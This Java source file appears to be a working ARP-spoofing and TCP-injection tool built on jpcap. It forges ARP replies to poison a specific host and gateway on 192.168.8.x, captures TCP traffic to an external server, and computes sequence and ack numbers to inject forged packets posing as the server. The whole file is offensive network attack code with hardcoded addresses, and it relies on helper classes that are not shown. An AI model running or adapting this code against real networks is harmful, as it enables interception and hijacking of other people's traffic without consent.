package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import Factory.ARPFactory;
import Model.Model_Capture;
import Model.Model_a;
import Model.TestPacketReceiver;
import Util.SetPacket.SetARP;
import Util.SetPacket.SetTCP;

public class Manager_cheatServiceAndHost {
	
	static Model_Capture cpmodel = new Model_Capture();
	static List<TCPPacket> cpmodels = new ArrayList<TCPPacket>();
	
	//这3个LIST用来装要发送的包 ARP  TCPtohost  TCPtoservice
	
	static List<ARPPacket> ARPs = new ArrayList<ARPPacket>();
	static List<TCPPacket> TCPtohosts = new ArrayList<TCPPacket>();
	static List<TCPPacket> TCPtoservices = new ArrayList<TCPPacket>();
	
	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	static Object flag = new Object(); 
	
	
	//配置文件
	static int ARP_INTERVAL;
	
	{
		readProperties();
		
	}
		
	public static void main(String[] args) {
		
		//获取发送数据包的网卡
		JpcapSender js = getCrad(0);
		//Manager_cheatServiceAndHost mc= new Manager_cheatServiceAndHost();
		
		/*************************************************
		 * 伪造ARP数据，添加到待发送列表中
		 *************************************************/                                                       
		setARPs("192.168.8.100","192.168.8.1","60:d8:19:4a:b2:fc",null,null);
		/************************************************* 
		 * 启动发包线程，检查发包列表，需要不停的发送
		 *************************************************/
		sentThread(js);
		
		/*************************************************
		 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
		 * 并且计算出伪造数据加入到发送列表
		 *************************************************/
		capPacket_run(0,"192.168.8.100","119.29.42.117");
		
		
		/*************************************************
		 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
		 * 模式一：只转发数据
		 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
		 *************************************************/
		fakeThread(2,"60:d8:19:4a:b2:fc");
		
	}
	
	
	/*************************************************
	 * 启动函数
	 *************************************************/
	public void start(){
		
		//获取发送数据包的网卡
				JpcapSender js = getCrad(0);
				
				/*************************************************
				 * 伪造ARP数据，添加到待发送列表中
				 *************************************************/
				setARPs("192.168.8.100","192.168.8.1","60:d8:19:4a:b2:fc","AC:CF:23:87:BD:2E","E4:D3:32:E0:7B:82");
				
				
				/************************************************* 
				 * 启动发包线程，检查发包列表，需要不停的发送
				 *************************************************/
				sentThread(js);
				
				/*************************************************
				 * ARP欺骗成功后，开始捕获主机发送的数据放入到cpmodel中,
				 * 并且计算出伪造数据加入到发送列表
				 *************************************************/
				capPacket_run(0,"192.168.8.100","119.29.42.117");
				
				/*************************************************
				 * 选择模式，进入伪造线程，开始伪造数据,并添加到待发送列表
				 * 模式一：只转发数据
				 * 模式二：拦截主机和服务器的数据，并且发送伪造与主机的通信
				 *************************************************/
				fakeThread(2,"60:d8:19:4a:b2:fc");	
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 抓包线程第一个参数是网卡序号，后面是主机IP和服务器IP
	 *************************************************/
	public static void capPacket_run(int i,String host_ip, String service_ip){
	    
	       try{    
	            //获取本机上的网络接口对象数组    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //创建某个卡口上的抓取对象,设置最大一次性抓包大小为2000byte
	        JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        startCapThread(jpcap,host_ip,service_ip);    
	        System.out.println("开始抓取第"+i+"个卡口上的数据");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("启动失败:  "+ef);    
	        }      
	   }
	    //将Captor放到独立线程中运行    
	   public static void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip ){    
	       //JpcapCaptor jp=jpcap;    
	       java.lang.Runnable rnner=new Runnable(){      

			public void run(){    
	               //使用接包处理器循环抓包-1表示无限制的抓取数据包   "192.168.8.101","119.29.42.117"
				
				//是否放进循环内部
				TestPacketReceiver pr = new TestPacketReceiver(host_ip,"E4:D3:32:E0:7B:82");
				
	        	   while(true){	    
	        		  jpcap.loopPacket(1, pr);
	        		  
	        		  //拿到抓取到的，指定的TCPmodel 需要对model中的数据进行分析和计算并且把计算的数据返回出线程
	        		  if(pr.getModel() != null){
	        			  
	        			  if(pr.getModel().getFlag().equals("syn")){
	        				  
	        				  System.out.println("握手帧......更新cpmodel失败");
	        				  continue;
	        			  }
	        			  
	        			  
	        			  //锁住capmodel
	        			  synchronized (flag) {
	        				  
	        				  
	        				  if(cpmodel.getAcknum() == 0){
		        				  
		        				  cpmodel =  pr.getModel();	
		        				  System.out.println("cpmodel初始化");
		        				  
		        				  
			        				  flag.notifyAll();
			        				  	//System.out.println("打开伪造线程......");
			        				 try {
			        					  //this?
			        					System.out.println("暂停抓包线程......");
										flag.wait();		
									} catch (InterruptedException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
		  
		        			  }  
		        			  //和之前的不同才添加进去
		        			  else if(cpmodel.getAcknum() != 0 && !cpmodel.issame(pr.getModel())){	  
	        					  cpmodel =  pr.getModel();	
	        					  System.out.println("cpmodel更改");
		        						flag.notifyAll();  
			        				 try {
			        					  //this?
			        					System.out.println("暂停抓包线程......");
										flag.wait();
										
									} catch (InterruptedException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
		        				  
		        			  }
	
						}	
	        		  } 
	        	   }    
	           }    
	       }; 
	       

			Thread capThread = new Thread(rnner);
			capThread.start();
	      // new Thread(rnner).start();//启动抓包线程    
	       System.out.println("抓包线程启动");
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  
	   
	   
	 /*************************************************
	 * 发包线程
	 *************************************************/
	   public static void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						
						//不停的发包
						while(true){
							if(js != null){
								//如果LIST不为空，就发送LIST里面的报包
								if(ARPs.size()!= 0){
									
									for(int i= 0 ;i<ARPs.size();i++){	
										js.sendPacket(ARPs.get(i));
										System.out.println("sending arp.."); 
									}	
								}
								
								synchronized (TCPtohosts) {
									if(TCPtohosts.size()!= 0){
										for(int i= 0 ;i<TCPtohosts.size();i++){	
											js.sendPacket(TCPtohosts.get(i));
										System.out.println("sending TCPtohost.."+"seq|"+TCPtohosts.get(i).sequence+" ack|"+TCPtohosts.get(i).ack_num); 
										}	
										
										//发送完毕之后清空，只发送一次
										TCPtohosts.clear();
									}
								}
								
								
								synchronized (TCPtoservices) {
									if(TCPtoservices.size()!= 0){
										for(int i= 0 ;i<TCPtoservices.size();i++){	
											js.sendPacket(TCPtoservices.get(i));
											System.out.println("sending TCPtohost.."+"seq|"+TCPtoservices.get(i).sequence+" ack|"+TCPtoservices.get(i).ack_num);
										}
										TCPtoservices.clear();
									}
									
								}
							}
							//this.wait(10000);
							Thread.sleep(7000);
						}
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			
			//new Thread(runner).start();
		   System.out.println("发包线程启动");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs设置
	 *************************************************/
	   public  static void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		   SetARP sa = new SetARP();
		   
		  ARPPacket arp1 =  sa.fakeARP(hostIP,routeIP,deviceMAC,yourMAC);
		  ARPPacket arp2 =  sa.fakeARP(routeIP,hostIP,routeMAC,yourMAC);
		  
		  ARPs.add(arp1);
		  ARPs.add(arp2); 
		  
		   /*ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				while(true){
					
					Set<ARPPacket> ARPs = arpFactory1.getInstance();
					Iterator<ARPPacket> it = ARPs.iterator();
					//把arp加入发送队列
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//每生产一次停止两秒
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();*/
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	  /*************************************************
	 * 伪造数据包线程,分为多种模式
	 *************************************************/
	  public static void fakeThread(int flags,final String  yourMAC){
		   
		   //模式一为直接转发接收到的数据

		   //模式2为拦截对方数据,转发自己伪造的数据
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("进入到伪造线程1");
					   int step = 0;
					  while(true){
						  
						  //同步锁
						  synchronized (flag) {	
							  
							  try {
								  System.out.println("伪造线程等待中......");
								  flag.wait();
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							
						 // }
						  	  	
						    
						  if(cpmodel != null){
							   //synchronized (cpmodel) {
								 //计算出伪造的数据包,返回一个TCPpcaket
							  System.out.println("开始伪造数据包......");
							  
							  if(!cpmodel.isTransation()){
								  
								  TCPPacket fakeTCP = fakeTCP(cpmodel,yourMAC,step);
								   
								   if(fakeTCP != null){ 
									   //锁住用来装TCP的list
									   synchronized (TCPtohosts) {	   
										TCPtohosts.add(fakeTCP);
										System.out.println("加入待发送列表......");
										//cpmodels.add(fakeTCP);
											step++;
									  }   
								   }
								  
							  }else{
								  
								  TCPPacket fakeTCP = fakeTCP(cpmodel,yourMAC,step);
								   
								   if(fakeTCP != null){ 
									   //锁住用来装TCP的list
									   synchronized (TCPtoservices) {	   
										TCPtoservices.add(fakeTCP);
										System.out.println("加入待发送列表......");
										//cpmodels.add(fakeTCP);
											step++;
									  }   
								   }
								  
								  
							  }	
							//}  
								   //继续启动抓包 
									  try {
										 System.out.println("重新打开抓包线程......");
										  flag.notify();;
									} catch (Exception e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}  	   
						  } 

						}  
					 }
					
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.setPriority(7);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	 * end
	 *************************************************/
	   
	   
	   
	   /*************************************************
	 * 用来伪造计算要发送的TCP帧
	 *************************************************/
	   public static TCPPacket fakeTCP(Model_Capture cpmodel,String  yourMAC,int step){
		  
		   
		   //先拿到要伪造的数据段
		   Manager_airdump ma = new Manager_airdump();
		   
		   
		   SetTCP st = new SetTCP();
		   TCPPacket tcp = null;
		   
		   //主机发往服务器
		   if(!cpmodel.isTransation()){
			   
			   //则我门要伪造的数据是伪造为服务器发给主机的
			   //先计算出seq ack
			   
			   long seq = 0;
			   long ack = 0;
			   
			   
			   
			   if(cpmodel.getFlag().equals("syn")){
				   
				   
				   
			   }
			   else if(cpmodel.getFlag().equals("ack")){
				   
				     
					   seq = cpmodel.getAcknum();
					   ack = cpmodel.getSeqnum();    
				   
				  
				   
			   }
			   else if(cpmodel.getFlag().equals("ack/push")){
				   
				   
				   //计算SEQ和ACK
				   seq = cpmodel.getAcknum();
				   ack = cpmodel.getSeqnum() + cpmodel.getDataLen();	  
			 }   
			   
			   Model_a model = null;
			   if(seq != 0){
				   
				   int index = step;
				   if(index <3){
					   if(index == 2)
						   index++;   
					    model= ma.run("1122.pcap","192.168.8.100").get(index);
					    
					    tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
				    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
				    			 yourMAC, "AC:CF:23:87:BD:2E", model);
		System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
					    
				   }
				   
				   else {
					   index = 3;
					   //model= ma.run("1122.pcap","192.168.8.100").get(index);
					   
					   tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
				    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
				    			 yourMAC, "AC:CF:23:87:BD:2E", null);
		System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack); 
					   
				   }
				  	   
			   }
			  
		   }
		   
		   //服务器发往主机
		   /*else if(cpmodel.isTransation()){
			   
			   
			   long seq = 0;
			   long ack = 0;
			   
			   
			   
			   if(cpmodel.getFlag().equals("syn")){
				   
				   
				   
			   }
			   else if(cpmodel.getFlag().equals("ack")){
				   
				     
					   seq = cpmodel.getAcknum();
					   ack = cpmodel.getSeqnum();    
				   
				  
				   
			   }
			   else if(cpmodel.getFlag().equals("ack/push")){
				   
				   
				   //计算SEQ和ACK
				   seq = cpmodel.getAcknum();
				   ack = cpmodel.getSeqnum() + cpmodel.getDataLen();	  
			 }   
			   
			   //填充的数据使用一个主机在静止状态下的心跳数据，待处理....
			   Model_a model = null;
			   
			   
			   tcp =  st.fakePacket(cpmodel.getPort_des(), cpmodel.getPort_sou(), 
		    			 seq, ack, cpmodel.getIp_des(), cpmodel.getIp_sou(),
		    			 yourMAC, "AC:CF:23:87:BD:2E", model);
System.out.println("伪造数据成功   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
			   
			   
		   }*/
		   
		  return tcp; 
	   } 
	   
	   /*************************************************
	 * end
	 *************************************************/


		
		 /*************************************************
			 * 获取用来发送数据的网卡
			 *************************************************/
		public static JpcapSender getCrad(int deviceNum){
				  
					NetworkInterface[] devices = null;
					
					 try{    
						 //获取本机上的网络接口对象数组    
						  devices = JpcapCaptor.getDeviceList();
		System.out.println("网卡获取成功  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
			System.out.println("显示网络接口数据失败:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
		System.out.println("已获取网卡(发送使用)  "+deviceNum+"  JSender建立成功");  				
					} catch (IOException e1) {
			System.out.println("JSender建立不成功");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		
		
		
		/*************************************************
		 * 读取配置文件prameter.properties
		 *************************************************/
		  public void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/prameter.properties" );    
		        try  {    
		           prop.load(in);    
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim());    
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		        
		        /*
		        File fileB = new File( this.getClass().getResource( "" ).getPath());  
		        
		        System. out .println( "fileB path: " + fileB);*/  
		  }
		  /*************************************************
		 * end
		 *************************************************/
}    